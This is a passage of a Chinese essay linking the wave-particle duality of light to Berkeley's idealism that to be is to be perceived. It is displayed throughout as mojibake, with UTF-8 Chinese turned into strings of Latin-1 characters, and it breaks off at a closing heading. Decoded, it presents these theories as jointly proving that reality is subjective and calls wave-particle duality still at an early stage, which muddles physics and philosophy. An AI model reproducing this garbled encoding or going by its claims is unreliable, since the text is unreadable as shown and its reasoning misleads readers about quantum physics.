´ï¼Œè§£å†³äº†å…‰çš„æ³¢ç²’æ¨¡å‹ä¹‹é—´é•¿æœŸå­˜åœ¨çš„äº‰è®ºã€‚è¯¥ç†è®ºè®¤ä¸ºï¼Œå…‰å¯ä»¥è¡¨ç°å‡ºæ³¢çŠ¶å’Œç²’å­çŠ¶è¡Œä¸ºï¼Œå…·ä½“å–å†³äºè§‚å¯Ÿæ–¹å¼ã€‚è‘—åçš„åŒç¼å®éªŒè¿›ä¸€æ­¥è¯å®äº†è¿™ä¸€ç†è®ºï¼Œè¯¥å®éªŒè¡¨æ˜å…‰åœ¨é€šè¿‡ä¸¤ä¸ªç‹­ç¼æ—¶å¯ä»¥è¡¨ç°å‡ºæ³¢çŠ¶å¹²æ¶‰å›¾æ¡ˆï¼Œä½†åœ¨è¢«æ£€æµ‹åˆ°æ—¶ä¹Ÿå¯ä»¥è¡¨ç°å‡ºç²’å­çŠ¶è¡Œä¸ºã€‚ ç†è®ºåŸºç¡€å’ŒåŸç† å…‰çš„æ³¢ç²’äºŒè±¡æ€§ç†è®ºçš„ç†è®ºåŸºç¡€æ¤æ ¹äºé‡å­åŠ›å­¦ã€‚åœ¨é‡å­åŠ›å­¦ä¸­ï¼Œç²’å­è¢«æè¿°ä¸ºæ³¢å‡½æ•°ï¼Œå®ƒä»¬çš„è¡Œä¸ºç”±æ³¢ç²’äºŒè±¡æ€§æè¿°ã€‚è¯¥ç†è®ºå‡å®šç²’å­çš„è¡Œä¸ºå–å†³äºå®ƒä»¬è¢«è§‚å¯Ÿçš„æ–¹å¼ï¼Œå¹¶ä¸”å®ƒä»¬å¯ä»¥è¡¨ç°å‡ºæ³¢çŠ¶æˆ–ç²’å­çŠ¶è¡Œä¸ºï¼Œè¿™å–å†³äºå®ƒä»¬è¢«æ£€æµ‹åˆ°çš„æ–¹å¼ã€‚ å…‰çš„æ³¢ç²’äºŒè±¡æ€§ç†è®ºåŸºäºå åŠ çš„æ¦‚å¿µï¼Œå³ä¸€ä¸ªç²’å­å¯ä»¥åŒæ—¶ä»¥å¤šç§çŠ¶æ€å­˜åœ¨ã€‚è¿™ä¸ªæƒ³æ³•ä¸ç»å…¸ç‰©ç†å­¦ç›¸åï¼Œç»å…¸ç‰©ç†å­¦å‡è®¾ç²’å­ä»¥ç¡®å®šçš„çŠ¶æ€å­˜åœ¨ï¼Œå¹¶ä¸”å¯ä»¥ç¡®å®šåœ°é¢„æµ‹å®ƒä»¬çš„è¡Œä¸ºã€‚åœ¨é‡å­åŠ›å­¦ä¸­ï¼Œç²’å­è¢«æè¿°ä¸ºæ¦‚ç‡æ³¢ï¼Œå®ƒä»¬çš„è¡Œä¸ºåªèƒ½æ ¹æ®æ¦‚ç‡æ¥é¢„æµ‹ã€‚ å®éªŒè¯æ®å’Œè®ºè¯ å…‰çš„æ³¢ç²’äºŒè±¡æ€§ç†è®ºå·²åœ¨å¤§é‡å®éªŒä¸­å¾—åˆ°è¯å®ã€‚å…¶ä¸­æœ€è‘—åçš„æ˜¯åŒç¼å®éªŒï¼Œè¯¥å®éªŒç”±æ‰˜é©¬æ–¯Â·æ¨(Thomas Young)äº19ä¸–çºªåˆé¦–å…ˆè¿›è¡Œã€‚åœ¨è¿™ä¸ªå®éªŒä¸­ï¼Œå…‰é€šè¿‡ä¸¤ä¸ªç‹­ç¼ï¼Œåœ¨ç‹­ç¼åé¢çš„å±å¹•ä¸Šè§‚å¯Ÿåˆ°ç”±æ­¤äº§ç”Ÿçš„å¹²æ¶‰å›¾æ ·ã€‚å¹²æ¶‰å›¾æ¡ˆè¡¨æ˜å…‰è¡¨ç°ä¸ºæ³¢ï¼Œæ³¢å³°å’Œæ³¢è°·ç›¸äº’å¹²æ¶‰ä»¥äº§ç”Ÿå›¾æ¡ˆã€‚ å¦ä¸€ä¸ªè¯æ˜å…‰çš„æ³¢ç²’äºŒè±¡æ€§ç†è®ºçš„å®éªŒæ˜¯å…‰ç”µæ•ˆåº”ã€‚åœ¨è¿™ä¸ªå®éªŒä¸­ï¼Œå…‰ç…§å°„åœ¨é‡‘å±è¡¨é¢ä¸Šï¼Œç”µå­ä»è¡¨é¢å‘å°„å‡ºæ¥ã€‚æ£€æµ‹åˆ°ç”µå­ï¼Œå‘ç°å®ƒä»¬çš„è¡Œä¸ºç±»ä¼¼äºç²’å­ã€‚è¿™ä¸ªå®éªŒè¡¨æ˜ï¼Œå…‰å¯ä»¥è¡¨ç°å‡ºæ³¢çŠ¶å’Œç²’å­çŠ¶ä¸¤ç§è¡Œä¸ºï¼Œè¿™å–å†³äºå®ƒæ˜¯å¦‚ä½•è¢«è§‚å¯Ÿåˆ°çš„ã€‚ è¿™äº›å®éªŒä»¥åŠå…¶ä»–è®¸å¤šå®éªŒä¸ºå…‰çš„æ³¢ç²’äºŒè±¡æ€§ç†è®ºæä¾›äº†æœ‰åŠ›çš„è¯æ®ï¼Œå¹¶è¯å®äº†å…¶æœ‰æ•ˆæ€§ã€‚è¯¥ç†è®ºä¸€ç›´æ˜¯é‡å­åŠ›å­¦å‘å±•çš„æ ¸å¿ƒï¼Œå¹¶å·²è¢«çº³å…¥ç‰©ç†å’Œå·¥ç¨‹çš„ä¼—å¤šé¢†åŸŸï¼ŒåŒ…æ‹¬ç”µä¿¡å’Œè®¡ç®—ã€‚å…‰çš„æ³¢ç²’äºŒè±¡æ€§ç†è®ºä»ç„¶æ˜¯ç‰©ç†å­¦ä¸­æœ€é‡è¦å’Œæœ€å¹¿æ³›ç ”ç©¶çš„ç†è®ºä¹‹ä¸€ï¼Œå…¶å«ä¹‰è‡³ä»Šä»åœ¨ç»§ç»­æ¢ç´¢å’Œç†è§£ã€‚ å­˜åœ¨å³è¢«æ„ŸçŸ¥ç†è®º å­˜åœ¨å³è¢«æ„ŸçŸ¥ç†è®ºè®¤ä¸ºï¼Œè§‚å¯Ÿè€…æ„ŸçŸ¥å¯¹è±¡å’Œäº‹ä»¶çš„æ–¹å¼å†³å®šäº†å®ƒä»¬çš„çœŸå®æ€§ã€‚æ¢å¥è¯è¯´ï¼Œç‰©ä½“æˆ–äº‹ä»¶çš„çœŸå®æ€§å–å†³äºè§‚å¯Ÿè€…åŠå…¶å¯¹å®ƒçš„æ„ŸçŸ¥ã€‚è¿™ä¸€ç†è®ºæ¤æ ¹äºå‡ åƒå¹´å‰çš„å“²å­¦å’Œå®—æ•™ä¼ ç»Ÿï¼Œä½†æœ€è‘—åçš„é˜è¿°æ˜¯åœ¨ 18 ä¸–çºªåˆçš„å“²å­¦å®¶ä¹”æ²»Â·ä¼¯å…‹åˆ©(George Berkeley)ã€‚ ä¼¯å…‹åˆ©å¯¹è¿™ä¸€ç†è®ºçš„è®ºè¯åŸºäºè¿™æ ·ä¸€ç§è§‚ç‚¹ï¼Œå³å­˜åœ¨çš„ä¸€åˆ‡éƒ½å¿…é¡»ä»¥æŸç§æ–¹å¼è¢«æ„ŸçŸ¥ã€‚æ ¹æ®ä¼¯å…‹åˆ©çš„è¯´æ³•ï¼Œç‰©ä½“åªå­˜åœ¨äºè§‚å¯Ÿè€…çš„è„‘æµ·ä¸­ï¼Œè€Œä½“éªŒå®ƒä»¬å­˜åœ¨çš„å”¯ä¸€æ–¹å¼æ˜¯é€šè¿‡æ„ŸçŸ¥ã€‚ä»è¿™ä¸ªæ„ä¹‰ä¸Šè¯´ï¼Œç°å®å®Œå…¨æ˜¯ä¸»è§‚çš„ï¼Œå®¢è§‚ä¸–ç•Œæ˜¯å¿ƒçµåˆ›é€ çš„å¹»è§‰ã€‚ å­˜åœ¨å³è¢«æ„ŸçŸ¥ç†è®ºé­åˆ°äº†æ‰¹è¯„å’Œæ”¯æŒï¼Œä¸€äº›äººè®¤ä¸ºå®ƒæ˜¯å¯¹ç°å®ä¸»è§‚æ€§çš„æœ‰åŠ›è®ºè¯ï¼Œè€Œå¦ä¸€äº›äººåˆ™è®¤ä¸ºå®ƒæœ‰ç¼ºé™·ä¸”ä¸åˆé€»è¾‘ã€‚ç„¶è€Œï¼Œæ— è®ºå…¶å“²å­¦æœ‰æ•ˆæ€§å¦‚ä½•ï¼Œè¯¥ç†è®ºåœ¨å‡ ä¸ªä¸–çºªä»¥æ¥ä¸€ç›´è¢«å¹¿æ³›è®¨è®ºå’Œäº‰è®ºï¼Œå¹¶å¯¹è¥¿æ–¹æ€æƒ³çš„å‘å±•äº§ç”Ÿäº†é‡å¤§å½±å“ã€‚ ä¸å…‰çš„æ³¢ç²’äºŒè±¡æ€§ç†è®ºçš„æ¯”è¾ƒ å…‰çš„æ³¢ç²’äºŒè±¡æ€§ç†è®ºå’Œå­˜åœ¨å³è¢«æ„ŸçŸ¥ç†è®ºæ˜¯ç›¸å…³çš„ï¼Œå› ä¸ºå®ƒä»¬éƒ½è¯æ˜äº†ç‰©ä½“çš„æ€§è´¨å–å†³äºè§‚å¯Ÿæ–¹å¼ã€‚åœ¨å…‰çš„æ³¢ç²’äºŒè±¡æ€§ç†è®ºçš„æƒ…å†µä¸‹ï¼Œå…‰çš„æ³¢çŠ¶å’Œç²’å­çŠ¶ç‰¹æ€§å–å†³äºç”¨äºæµ‹é‡å®ƒä»¬çš„è§‚å¯Ÿæ–¹æ³•ã€‚åŒæ ·ï¼Œåœ¨å­˜åœ¨å³è¢«æ„ŸçŸ¥ç†è®ºä¸­ï¼Œç‰©ä½“çš„çœŸå®æ€§å–å†³äºè§‚å¯Ÿè€…çš„æ„ŸçŸ¥ã€‚ ç„¶è€Œï¼Œè¿™ä¸¤ç§ç†è®ºä¹‹é—´å­˜åœ¨é‡è¦å·®å¼‚ã€‚è™½ç„¶å…‰çš„æ³¢ç²’äºŒè±¡æ€§ç†è®ºå·²è¢«å®éªŒè¯å®å¹¶è¢«ç§‘å­¦ç•Œå¹¿æ³›æ¥å—ï¼Œä½†å­˜åœ¨å³è¢«æ„ŸçŸ¥ç†è®ºæ›´å…·äº‰è®®æ€§å¹¶å—åˆ°æ‰¹è¯„ã€‚æ­¤å¤–ï¼Œå…‰çš„æ³¢ç²’äºŒè±¡æ€§ç†è®ºä¸ºå…‰çš„æœ¬è´¨åŠå…¶è¡Œä¸ºæ–¹å¼æä¾›äº†å…·ä½“çš„è§£é‡Šï¼Œè€Œå­˜åœ¨å³è¢«æ„ŸçŸ¥ç†è®ºä¸ºç°å®çš„æœ¬è´¨æä¾›äº†æ›´æ™®éçš„å“²å­¦è§£é‡Šã€‚ å¯¹ç†è§£ç°å®æœ¬è´¨çš„å½±å“ å…‰çš„æ³¢ç²’äºŒè±¡æ€§ç†è®ºå’Œå­˜åœ¨å³è¢«æ„ŸçŸ¥ç†è®ºéƒ½å¯¹æˆ‘ä»¬å¯¹ç°å®çš„ç†è§£å…·æœ‰é‡è¦æ„ä¹‰ã€‚å…‰çš„æ³¢ç²’äºŒè±¡æ€§ç†è®ºè¡¨æ˜ï¼Œç‰©ä½“çš„æ€§è´¨å¯èƒ½å–å†³äºè§‚å¯Ÿå®ƒçš„æ–¹å¼ï¼Œè€Œå®¢è§‚ä¸–ç•Œå¯èƒ½å¹¶ä¸æ€»æ˜¯å®ƒçœ‹èµ·æ¥çš„æ ·å­ã€‚è¿™å¯¼è‡´äº†å¯¹å…‰çš„æ€§è´¨å’Œé‡å­ä¸–ç•Œçš„æ–°æ€è€ƒæ–¹å¼ï¼Œå¹¶ä¸”æ˜¯é‡å­åŠ›å­¦å‘å±•çš„ä¸»è¦è´¡çŒ®è€…ã€‚ å¦ä¸€æ–¹é¢ï¼Œå­˜åœ¨å³è¢«æ„ŸçŸ¥ç†è®ºæš—ç¤ºç°å®å®Œå…¨æ˜¯ä¸»è§‚çš„ï¼Œå®¢è§‚ä¸–ç•Œæ˜¯å¿ƒçµåˆ›é€ çš„å¹»è§‰ã€‚è™½ç„¶è¿™ä¸ªæƒ³æ³•å¯èƒ½çœ‹èµ·æ¥å¾ˆæ¿€è¿›ï¼Œä½†å®ƒå·²ç»å¼•å‘äº†å…³äºç°å®æœ¬è´¨çš„é‡è¦é—®é¢˜ï¼Œå¹¶æ¿€å‘äº†å¯¹æ„ŸçŸ¥ã€ç°å®å’Œå¿ƒçµä¹‹é—´å…³ç³»çš„è¿›ä¸€æ­¥å“²å­¦æ¢ç©¶ã€‚ æ€»è€Œè¨€ä¹‹ï¼Œè™½ç„¶å…‰çš„æ³¢ç²’äºŒè±¡æ€§ç†è®ºä¸å­˜åœ¨å³è¢«æ„ŸçŸ¥ç†è®ºå­˜åœ¨é‡è¦å·®å¼‚ï¼Œä½†å®ƒä»¬ä¹‹é—´å­˜åœ¨è”ç³»ï¼Œå› ä¸ºå®ƒä»¬è¯æ˜äº†ç‰©ä½“çš„æ€§è´¨å–å†³äºè§‚å¯Ÿæ–¹å¼ã€‚è¿™äº›ç†è®ºå¯¹æˆ‘ä»¬ç†è§£ç°å®å…·æœ‰é‡è¦æ„ä¹‰ï¼Œå¹¶ä¸”å®ƒä»¬ä»ç„¶æ˜¯ç§‘å­¦å®¶ã€å“²å­¦å®¶å’Œå¯»æ±‚æ›´å¥½åœ°äº†è§£å‘¨å›´ä¸–ç•Œçš„ä¸ªäººçš„é‡è¦ç ”ç©¶é¢†åŸŸã€‚ ä¸¤ç§ç†è®ºä¹‹é—´çš„è”ç³» å…‰çš„æ³¢ç²’äºŒè±¡æ€§ç†è®ºä¸å­˜åœ¨å³è¢«æ„ŸçŸ¥ç†è®ºçš„å…³ç³»åˆ†æ å…‰çš„æ³¢ç²’äºŒè±¡æ€§ç†è®ºå’Œå­˜åœ¨å³è¢«æ„ŸçŸ¥ç†è®ºæ˜¯ä¸¤ä¸ªçœ‹ä¼¼æˆªç„¶ä¸åŒçš„ç†è®ºï¼Œä½†åœ¨æ¢ç´¢ç°å®æœ¬è´¨çš„è¿‡ç¨‹ä¸­å´æœ‰ç€å…±åŒç‚¹ã€‚è¿™ä¸¤ç§ç†è®ºéƒ½è¯•å›¾ç†è§£è¢«è§‚å¯Ÿè€…ä¸è§‚å¯Ÿè€…ä¹‹é—´çš„å…³ç³»ï¼Œä»¥åŠè¿™ç§å…³ç³»å¦‚ä½•å¡‘é€ æˆ‘ä»¬å¯¹å‘¨å›´ä¸–ç•Œçš„ç†è§£ã€‚å…‰çš„æ³¢ç²’äºŒè±¡æ€§ç†è®ºè¡¨æ˜ï¼Œå…‰å¦‚ä½•æ ¹æ®è§‚å¯Ÿæ–¹å¼è¡¨ç°å‡ºæ³¢å’Œç²’å­çš„ç‰¹æ€§ï¼Œè€Œå­˜åœ¨å³è¢«æ„ŸçŸ¥ç†è®ºæ–­è¨€ï¼Œæˆ‘ä»¬æ‰€ç»å†çš„ç°å®æ˜¯ç”±æˆ‘ä»¬æ„ŸçŸ¥å®ƒçš„æ–¹å¼å¡‘é€ çš„ã€‚ å…‰çš„æ³¢ç²’äºŒè±¡æ€§ç†è®ºæºäºæ—©æœŸçš„å…‰å’Œç‰©è´¨å®éªŒï¼Œä¾‹å¦‚åŒç¼å®éªŒã€‚è¿™ä¸ªå®éªŒè¡¨æ˜ï¼Œå½“å…‰ä»¥æ³¢çš„å½¢å¼è¢«è§‚å¯Ÿåˆ°æ—¶ï¼Œå®ƒå¯ä»¥ç©¿è¿‡ä¸¤ä¸ªç‹­ç¼ï¼Œå¹¶åœ¨ç‹­ç¼åé¢çš„å±å¹•ä¸Šäº§ç”Ÿå¹²æ¶‰å›¾æ ·ã€‚ç„¶è€Œï¼Œå½“å…‰ä»¥ç²’å­çš„å½¢å¼è¢«è§‚å¯Ÿæ—¶ï¼Œå®ƒä¸€æ¬¡åªé€šè¿‡ä¸€ä¸ªç‹­ç¼ï¼Œå¹¶æ²¡æœ‰äº§ç”Ÿå¹²æ¶‰å›¾æ ·ã€‚è¿™ä¸ªå®éªŒè¡¨æ˜ï¼Œå…‰çš„æ€§è´¨ä¼šéšç€è§‚å¯Ÿæ–¹å¼çš„ä¸åŒè€Œå‘ç”Ÿå˜åŒ–ã€‚ åŒæ ·ï¼Œå­˜åœ¨å³è¢«æ„ŸçŸ¥ç†è®ºè¡¨æ˜æˆ‘ä»¬å¯¹ç°å®çš„ç†è§£æ˜¯ç”±æˆ‘ä»¬æ„ŸçŸ¥å®ƒçš„æ–¹å¼å†³å®šçš„ã€‚è¯¥ç†è®ºæ–­è¨€ï¼Œæˆ‘ä»¬æ‰€ç»å†çš„ä¸–ç•Œä¸æ˜¯ç‹¬ç«‹äºæˆ‘ä»¬çš„æ„ŸçŸ¥è€Œå­˜åœ¨çš„å®¢è§‚ç°å®ï¼Œè€Œæ˜¯ç”±æˆ‘ä»¬çš„æ„ŸçŸ¥å’Œä¸ä¸–ç•Œçš„ç›¸äº’ä½œç”¨æ‰€åˆ›é€ çš„ä¸»è§‚ç°å®ã€‚ä»è¿™ä¸ªæ„ä¹‰ä¸Šè¯´ï¼Œæˆ‘ä»¬æ‰€ç»å†çš„ç°å®æ˜¯æˆ‘ä»¬æ€æƒ³ä»¥åŠæˆ‘ä»¬å¦‚ä½•å¤„ç†æ¥è‡ªå‘¨å›´ä¸–ç•Œçš„ä¿¡æ¯çš„äº§ç‰©ã€‚ è®¨è®ºè”ç³»å¯¹æˆ‘ä»¬ç†è§£ç°å®çš„å½±å“ å…‰çš„æ³¢ç²’äºŒè±¡æ€§ç†è®ºä¸å­˜åœ¨å³è¢«æ„ŸçŸ¥ç†è®ºä¹‹é—´çš„è”ç³»å¯¹æˆ‘ä»¬å¯¹ç°å®çš„ç†è§£å…·æœ‰é‡è¦æ„ä¹‰ã€‚å®ƒè¡¨æ˜ç°å®çš„æœ¬è´¨å¯èƒ½æ¯”æˆ‘ä»¬ä¹‹å‰æƒ³è±¡çš„æ›´åŠ å¤æ‚å’Œéš¾ä»¥æ‰æ‘¸ã€‚å…‰çš„æ³¢ç²’äºŒè±¡æ€§ç†è®ºè¡¨æ˜ï¼Œå…‰çš„ç‰¹æ€§å¯ä»¥æ ¹æ®è§‚å¯Ÿæ–¹å¼è€Œæ”¹å˜ï¼Œè€Œå­˜åœ¨å³è¢«æ„ŸçŸ¥ç†è®ºè¡¨æ˜ï¼Œæˆ‘ä»¬ä½“éªŒåˆ°çš„ç°å®æ˜¯ç”±æˆ‘ä»¬æ„ŸçŸ¥å®ƒçš„æ–¹å¼å¡‘é€ çš„ã€‚ è¿™äº›ç†è®ºå…±åŒè¡¨æ˜ï¼Œæˆ‘ä»¬å¯¹ç°å®çš„ç†è§£å¯èƒ½ä¼šå—åˆ°æˆ‘ä»¬è§‚å¯Ÿå’Œæ„ŸçŸ¥å‘¨å›´ä¸–ç•Œçš„æ–¹å¼çš„é™åˆ¶ã€‚è¿™å¯¹ç§‘å­¦ç ”ç©¶å…·æœ‰é‡è¦æ„ä¹‰ï¼Œå› ä¸ºå®ƒè¡¨æ˜æˆ‘ä»¬çš„å®éªŒå’Œæµ‹é‡å¯èƒ½ä¼šå—åˆ°æˆ‘ä»¬è§‚å¯Ÿå’Œæ„ŸçŸ¥ä¸–ç•Œçš„æ–¹å¼çš„é™åˆ¶ã€‚è¿™ä¹Ÿå¯¹æˆ‘ä»¬ç†è§£ä¸»è§‚ä½“éªŒä»¥åŠæ„ŸçŸ¥åœ¨å¡‘é€ æˆ‘ä»¬çš„ç°å®ä¸­æ‰€èµ·çš„ä½œç”¨æœ‰å½±å“ã€‚ æ¢ç´¢å¯¹å…¶ä»–ç ”ç©¶é¢†åŸŸçš„å¯èƒ½è”ç³»å’Œå½±å“ å…‰çš„æ³¢ç²’äºŒè±¡æ€§ç†è®ºä¸å­˜åœ¨å³è¢«æ„ŸçŸ¥ç†è®ºä¹‹é—´çš„è”ç³»ä¹Ÿå¯¹å…¶ä»–ç ”ç©¶é¢†åŸŸå…·æœ‰æ½œåœ¨å½±å“ã€‚ä¾‹å¦‚ï¼Œå®ƒå¯èƒ½å¯¹é‡å­ç‰©ç†å­¦é¢†åŸŸæœ‰å½±å“ï¼Œè¯¥é¢†åŸŸä¸ç†è§£äºšåŸå­ç²’å­çš„è¡Œä¸ºæœ‰å…³ã€‚å…‰çš„æ³¢ç²’äºŒè±¡æ€§ç†è®ºå’Œå­˜åœ¨å³è¢«æ„ŸçŸ¥ç†è®ºéƒ½è¡¨æ˜ï¼Œæˆ‘ä»¬å¯¹ç°å®çš„ç†è§£å¯èƒ½ä¼šå—åˆ°æˆ‘ä»¬è§‚å¯Ÿå’Œæ„ŸçŸ¥ä¸–ç•Œçš„æ–¹å¼çš„å½±å“ï¼Œè¿™å¯èƒ½å¯¹æˆ‘ä»¬å¯¹é‡å­ä¸–ç•Œçš„ç†è§£äº§ç”Ÿå½±å“ã€‚ æ­¤å¤–ï¼Œè¿™ä¸¤ç§ç†è®ºä¹‹é—´çš„è”ç³»å¯èƒ½å¯¹å¿ƒç†å­¦é¢†åŸŸå’ŒçŸ¥è§‰ç ”ç©¶äº§ç”Ÿå½±å“ã€‚å­˜åœ¨å³è¢«æ„ŸçŸ¥ç†è®ºè¡¨æ˜ï¼Œæˆ‘ä»¬çš„æ„ŸçŸ¥åœ¨å¡‘é€ æˆ‘ä»¬çš„ç°å®ä¸­èµ·ç€é‡è¦ä½œç”¨ï¼Œè¿™å¯èƒ½å¯¹æˆ‘ä»¬ç†è§£æ„ŸçŸ¥å¦‚ä½•å½±å“æˆ‘ä»¬çš„è¡Œä¸ºå’Œæ€ç»´è¿‡ç¨‹æœ‰å½±å“ã€‚ æ€»çš„æ¥è¯´ï¼Œå…‰çš„æ³¢ç²’äºŒè±¡æ€§ç†è®ºä¸å­˜åœ¨å³è¢«æ„ŸçŸ¥ç†è®ºä¹‹é—´çš„è”ç³»å¯¹æˆ‘ä»¬å¯¹ç°å®çš„ç†è§£å…·æœ‰é‡è¦æ„ä¹‰ï¼Œå¹¶æœ‰å¯èƒ½å½±å“è®¸å¤šç ”ç©¶é¢†åŸŸã€‚å¯¹è¿™ç§è”ç³»çš„è¿›ä¸€æ­¥ç ”ç©¶å¯èƒ½ä¼šæä¾›å¯¹ç°å®æœ¬è´¨çš„æ›´æ·±å…¥è§è§£ï¼Œå¹¶å¸®åŠ©æˆ‘ä»¬æ›´å¥½åœ°ç†è§£è§‚å¯Ÿå’Œæ„ŸçŸ¥åœ¨å¡‘é€ æˆ‘ä»¬å¯¹å‘¨å›´ä¸–ç•Œçš„ç†è§£æ–¹é¢æ‰€èµ·çš„ä½œç”¨ã€‚ å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™äº›ç†è®ºä»å¤„äºå‘å±•çš„æ—©æœŸé˜¶æ®µï¼Œå…³äºå…‰çš„æ³¢ç²’äºŒè±¡æ€§ç†è®ºä¸å­˜åœ¨å³è¢«æ„ŸçŸ¥ç†è®ºä¹‹é—´çš„è”ç³»ï¼Œä»æœ‰è®¸å¤šæœ‰å¾…æ¢ç´¢å’Œç†è§£ã€‚ç„¶è€Œï¼Œè¿™ç§è”ç³»çš„æ½œåœ¨å½±å“æ˜¯ä»¤äººå…´å¥‹çš„ï¼Œå¹¶ä¸”æœ‰å¯èƒ½ä»¥æ·±åˆ»çš„æ–¹å¼å¡‘é€ æˆ‘ä»¬å¯¹ç°å®çš„ç†è§£ã€‚ æ€»ä¹‹ï¼Œå…‰çš„æ³¢ç²’äºŒè±¡æ€§ç†è®ºä¸å­˜åœ¨å³è¢«æ„ŸçŸ¥ç†è®ºä¹‹é—´çš„è”ç³»æ˜¯ä¸€ä¸ªå¤æ‚è€Œæœ‰è¶£çš„ç ”ç©¶é¢†åŸŸï¼Œå¯¹æˆ‘ä»¬å¯¹ç°å®çš„ç†è§£å…·æœ‰é‡è¦æ„ä¹‰ã€‚å¯¹è¿™ç§è”ç³»çš„è¿›ä¸€æ­¥ç ”ç©¶æœ‰å¯èƒ½æ­ç¤ºç°å®çš„æœ¬è´¨ä»¥åŠå®ƒæ˜¯å¦‚ä½•é€šè¿‡è§‚å¯Ÿå’Œæ„ŸçŸ¥å½¢æˆçš„ã€‚ æ€»ç»“ ä¸»è¦å‘ç°å’Œç»“è®ºæ€»ç»“ åœ¨æœ¬è®ºæ–‡ä¸­ï¼Œæˆ‘ä»¬åˆ†æäº†å…‰çš„æ³¢ç²’äºŒè±¡æ€§ç†è®ºä¸å­˜åœ¨å³è¢«æ„ŸçŸ¥ç†è®ºä¹‹é—´çš„è”ç³»ã€‚æˆ‘ä»¬é¦–å…ˆä»‹ç»äº†å…‰çš„æ³¢ç²’äºŒè±¡æ€§ç†è®ºï¼Œå³å½“ä»¥æ³¢çš„å½¢å¼è§‚å¯Ÿå…‰æ—¶ï¼Œå®ƒä¼šè¡¨ç°å‡ºæ³¢çš„æ€§è´¨ï¼Œè€Œå½“ä»¥ç²’å­çš„å½¢å¼è§‚å¯Ÿå…‰æ—¶ï¼Œå®ƒä¼šè¡¨ç°å‡ºç±»ç²’å­çš„æ€§è´¨ã€‚è¿™ç§å¯¹å¶æ€§ç†è®ºå·²å¾—åˆ°å¹¿æ³›ç ”ç©¶ï¼Œå¹¶å¾—åˆ°å¤§é‡å®éªŒå’Œè®ºè¯çš„æ”¯æŒã€‚ ç„¶åæˆ‘ä»¬è½¬å‘å­˜åœ¨å³è¢«æ„ŸçŸ¥ç†è®ºï¼Œè¿™æ˜¯ä¸€ç§å“²å­¦ç†è®ºï¼Œè¡¨æ˜ç‰©ä½“çš„å­˜åœ¨å’Œå±æ€§å–å†³äºè§‚å¯Ÿè€…å¯¹å®ƒä»¬çš„æ„ŸçŸ¥ã€‚è¯¥ç†è®ºè¿˜å¼ºè°ƒäº†è§‚å¯Ÿè€…ä¸è¢«è§‚å¯Ÿè€…ä¹‹é—´çš„ç›¸äº’è”ç³»ï¼Œè¡¨æ˜ç°å®çš„æœ¬è´¨æ˜¯ä¸»è§‚çš„å’Œç›¸å¯¹çš„ã€‚ æˆ‘ä»¬çš„åˆ†æè¡¨æ˜ï¼Œè¿™ä¸¤ç§ç†è®ºä¹‹é—´å­˜åœ¨é‡è¦è”ç³»ï¼Œç‰¹åˆ«æ˜¯åœ¨å®ƒä»¬å¯¹ç†è§£ç°å®æœ¬è´¨çš„å½±å“æ–¹é¢ã€‚å…‰çš„æ³¢ç²’äºŒè±¡æ€§ç†è®ºå¼ºè°ƒäº†ä¸€ä¸ªäº‹å®ï¼Œå³å…‰çš„æ€§è´¨å–å†³äºå®ƒå¦‚ä½•è¢«è§‚å¯Ÿåˆ°ï¼Œè€Œå­˜åœ¨å³è¢«æ„ŸçŸ¥ç†è®ºåˆ™å¼ºè°ƒäº†ç‰©ä½“å¯¹è§‚å¯Ÿçš„ä¾èµ–æ€§ã€‚è¿™ä¸¤ä¸ªç†è®ºå…±åŒè¡¨æ˜ï¼Œç°å®çš„æœ¬è´¨æ˜¯ç›¸å¯¹çš„ï¼Œä¾èµ–äºè§‚å¯Ÿï¼Œæˆ‘ä»¬æ„ŸçŸ¥çš„ä¸–ç•Œæ˜¯æˆ‘ä»¬ä¸»è§‚ç»éªŒçš„äº§ç‰©ã€‚ æœªæ¥ç ”ç©¶æ–¹å‘çš„è®¨è®º æœ¬ç ”ç©¶åˆæ­¥æ£€éªŒäº†è¿™ä¸¤ç§ç†è®ºä¹‹é—´çš„è”ç³»ï¼Œè¿˜æœ‰å¾ˆå¤§çš„ç ”ç©¶ç©ºé—´ã€‚æœªæ¥ç ”ç©¶çš„ä¸€ä¸ªæ–¹å‘å¯èƒ½æ˜¯æ¢ç´¢å…‰çš„æ³¢ç²’äºŒè±¡æ€§ç†è®ºä¸å…¶ä»–ç‰©ç†å­¦é¢†åŸŸï¼ˆå¦‚é‡å­åŠ›å­¦ï¼‰ä¹‹é—´çš„å¯èƒ½è”ç³»ã€‚è¿™å°†æä¾›å¯¹ç°å®æœ¬è´¨å’Œæˆ‘ä»¬æ„ŸçŸ¥çš„å±€é™æ€§çš„æ›´æ·±å…¥ç†è§£ã€‚ å¦ä¸€ä¸ªç ”ç©¶é¢†åŸŸå¯èƒ½æ˜¯æ¢ç´¢è¿™ä¸¤ç§ç†è®ºä¹‹é—´çš„è”ç³»å¯¹æˆ‘ä»¬ç†è§£æ„è¯†çš„å½±å“ã€‚å­˜åœ¨å³è¢«æ„ŸçŸ¥ç†è®ºè¡¨æ˜ç°å®æ˜¯ä¸»è§‚çš„ï¼Œç‰©ä½“åŠå…¶å±æ€§å–å†³äºè§‚å¯Ÿã€‚è¿™å¯¹æˆ‘ä»¬ç†è§£æ„è¯†çš„æœ¬è´¨ä»¥åŠå®ƒå¦‚ä½•å½±å“æˆ‘ä»¬å¯¹ä¸–ç•Œçš„çœ‹æ³•å…·æœ‰é‡è¦æ„ä¹‰ã€‚ æœ€åï¼Œæœªæ¥çš„ç ”ç©¶å¯ä»¥ä¾§é‡äºæ£€éªŒè¿™ä¸¤ç§ç†è®ºä¸å…¶ä»–å“²å­¦ç†è®ºï¼ˆå¦‚å”¯å¿ƒä¸»ä¹‰ã€ç°å®ä¸»ä¹‰å’Œå”¯æˆ‘è®ºï¼‰ä¹‹é—´çš„è”ç³»ã€‚è¿™å°†æä¾›å¯¹ç°å®çš„æœ¬è´¨å’Œæˆ‘ä»¬æ„ŸçŸ¥çš„å±€é™æ€§çš„å…¨é¢æ£€æŸ¥ã€‚ å…³äºä¸¤ç§ç†è®ºè”ç³»æ„ä¹‰çš„æœ€åæ€è€ƒ 